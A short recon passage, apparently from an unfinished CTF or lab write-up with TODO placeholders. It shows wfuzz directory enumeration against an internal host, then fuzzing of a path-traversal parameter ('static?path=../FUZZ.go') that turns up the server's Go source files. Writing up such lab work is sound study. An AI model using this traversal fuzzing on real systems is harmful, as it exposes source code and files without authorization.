## Recon

```bash
pwn:~$ wfuzz -w directory-list-2.3-small.txt --hc 404 http://ca.internal:8080/FUZZ
ID           Response   Lines    Word     Chars       Payload
000000269:   200        47 L     111 W    1110 Ch     "static" 
000001430:   405        0 L      3 W      18 Ch       "request"
000011792:   405        0 L      3 W      18 Ch       "validate"
```

```bash
pwn:~$ curl http://ca.internal:8080/static
TODO
TODO: Screenshot of the Swagger UI
```

Notice shueca-go

```bash
pwn:~$ wfuzz -w directory-list-2.3-small.txt --hc 500 http://ca.internal:8080/static?path=../FUZZ.go
ID           Response   Lines    Word     Chars       Payload                       
000000077:   200        167 L    421 W    3720 Ch     "main"
000000624:   200        123 L    351 W    2955 Ch     "crypto"
000004213:   200        67 L     186 W    1385 Ch     "challenge"
```
